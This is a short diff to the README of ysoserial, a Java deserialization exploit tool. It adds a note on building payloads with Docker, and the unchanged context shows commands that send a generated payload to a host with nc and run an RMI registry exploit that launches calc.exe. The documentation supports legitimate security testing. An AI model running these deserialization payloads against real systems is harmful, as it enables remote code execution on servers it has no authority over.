@@ -101,6 +101,12 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
+If you use the Dockerfile provided to build your payloads make sure you run docker with `--tty=false`:
+
+```shell
+$ docker run -it --tty=false ysoserial CommonsCollections6 uname > payload.bin
+```
+
 ## Installation
 
 1. Download the latest jar from
